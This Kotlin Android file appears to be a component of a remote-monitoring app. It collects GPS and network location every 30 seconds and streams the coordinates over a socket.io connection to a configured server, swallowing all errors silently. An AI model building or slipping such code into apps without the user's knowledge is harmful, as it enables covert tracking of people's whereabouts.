package com.app.cyber

import android.content.Context
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject

object LocationService {
    private var lastLocation: Location? = null
    private var socket: Socket? = null

    fun start(ctx: Context) {
        try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val listener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    lastLocation = location
                    push()
                }
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }
            try { lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000L, 10f, listener) } catch (_: SecurityException) {}
            try { lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000L, 10f, listener) } catch (_: SecurityException) {}
        } catch (e: Exception) { }
    }

    fun sendLast(ctx: Context) {
        push()
    }

    private fun push() {
        val loc = lastLocation ?: return
        val o = JSONObject()
        o.put("action", "location")
        o.put("lat", loc.latitude)
        o.put("lng", loc.longitude)
        o.put("acc", loc.accuracy)
        try {
            if (socket == null || !socket!!.connected()) {
                socket = IO.socket(Config.BaseUrl)
                socket?.connect()
            }
            socket?.emit("device-data", o)
        } catch (e: Exception) { }
    }
}
